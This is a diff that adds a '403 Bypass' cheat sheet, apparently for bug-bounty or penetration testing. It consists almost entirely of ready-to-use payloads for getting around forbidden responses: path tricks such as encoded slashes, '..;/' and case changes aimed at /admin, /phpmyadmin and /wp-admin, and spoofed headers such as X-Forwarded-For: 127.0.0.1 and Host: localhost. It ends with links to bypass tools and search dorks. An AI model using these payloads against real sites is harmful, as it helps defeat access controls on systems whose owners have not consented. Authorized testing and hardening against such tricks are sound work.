@@ -1,1 +1,86 @@
+403 Bypass
+403 Bypass: The 403 Forbidden error indicates that the server understands the request but can’t
+provide additional access. This means that the web page you’re trying to open in your browser is a
+resource that you’re not allowed to access.
 
+Adding in URL Paths:
+/*
+/%2f/
+/./
+/
+/*/
+/phpmyadmin/*
+/./phpmyadmin/
+//phpmyadmin//
+/*/phpmyadmin/
+///phpmyadmin///
+//wp-admin//
+
+Example:
+http://target.com/%2e/admin
+http://target.com/secret/.
+http://target.com//secret//
+http://target.com/./secret/..
+http://target.com/;/secret
+http://target.com/.;/secret
+http://target.com//;//secret
+http://target.com/admin..;/
+http://target.com/aDmIN
+test.com/admin/*
+est.com/*admin/
+test.com/%2fadmin/
+test.com%2fadmin%2f
+test.com/./admin/
+test.com//admin/./
+test.com///admin///
+test.com//admin//
+test.com/ADMIN/
+test.com/;/admin/
+test.com//;//admin/
+https://www.example.com..;/api/v1/users
+https://www.example.com/api..;/v1/users
+https://www.example.com/api/v1..;/users
+https://www.example.com/..;api/v1/users
+https://www.example.com/api/..;v1/users
+https://www.example.com/api/v1/..;users
+https://www.example.com/api/v1/users/..;
+https://www.example.com/api/v1/users/..;/
+
+Adding Headers in request:
+X-Custom-IP-Authorization
+X-Forwarded-For
+X-Forward-For
+X-Remote-IP
+X-Originating-IP
+X-Remote-Addr
+X-Client-IP
+X-Real-IP
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded: 127.0.0.1
+Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+X-Original-URL: 127.0.0.1
+Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Cluster-Client-IP: 127.0.0.1
+Host: localhost
+X-Real-IP: 127.0.0.1
+
+Link:
+https://github.com/iamj0ker/bypass-403
+https://github.com/yunemse48/403bypasser
+https://github.com/LucasPDiniz/403-Bypass
+https://github.com/Dheerajmadhukar/4-ZERO-3
+https://github.com/byt3hx/403-bypass
+https://github.com/diiablo00/403-bypass
+https://github.com/aardwolfsecurityltd/Bulk_403_Bypass
+https://github.com/devploit/dontgo403
+https://github.com/KathanP19/HowToHunt/blob/master/Status_Code_Bypass/403Bypass.md
+https://medium.com/@uttamgupta_/14-bypass-403-forbidden-82df3cfe5386
+
+dork
+intext:"403 bypass" site:medium.com
+intext:"403 bypass" site:github.com
